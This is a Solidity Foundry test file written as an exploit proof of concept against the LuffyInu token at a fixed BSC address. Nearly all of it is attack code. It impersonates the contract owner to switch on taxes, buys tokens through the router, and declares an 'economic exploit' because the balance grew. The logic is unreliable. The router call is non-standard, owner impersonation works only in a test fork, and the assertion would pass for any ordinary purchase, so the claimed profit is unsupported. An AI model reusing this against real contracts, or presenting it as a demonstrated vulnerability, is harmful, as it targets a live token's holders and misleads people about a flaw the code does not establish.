interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x720f6edD18f5e2F414DBa8fCD81E98724708c39E;
    address attacker = address(this);
    address private weth;
    IUniswapV2Router02 private router;
    LuffyInu private token;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: get BNB and prepare interfaces
        vm.deal(attacker, 100 ether);

        // Label addresses for debugging
        vm.label(TARGET, "LuffyInu Token");
        vm.label(0x10ED43C718714eb63d5aA57B78B54704E256024E, "PancakeRouter");

        // Get the pair address from the token contract
        token = LuffyInu(TARGET);
        address pair = token.uniswapV2Pair();
        vm.label(pair, "Token-WETH Pair");

        // Get WETH address from router
        router = IUniswapV2Router02(token.routerAddress());
        weth = router.WETH();
        vm.label(weth, "WETH");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Store initial balance
        uint256 initialBalance = token.balanceOf(attacker);

        // Step 1: Enable taxes by impersonating owner
        address owner = token.owner();
        vm.prank(owner);
        token.setTax(true);

        // Step 2: Buy tokens with BNB
        // Prepare swap path: WETH -> Token
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        // Buy a significant amount to maximize profit
        uint256 amountOutMin = 0; // Accept any amount for simplicity
        uint256 deadline = block.timestamp + 3600;

        // Execute swap
        router.swapETHForTokens{value: 10 ether}(
            amountOutMin,
            path,
            attacker,
            deadline
        );

        // Step 3: Check profit
        uint256 finalBalance = token.balanceOf(attacker);
        uint256 tokensReceived = finalBalance - initialBalance;

        // The profit comes from the fact that:
        // 1. We paid X BNB for Y tokens
        // 2. But the pair lost additional tokens to marketing/burn
        // 3. So our effective price is better than it should be

        // For demonstration, we can also sell some back to realize profit
        // But the main exploit is already demonstrated by the flawed fee logic
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

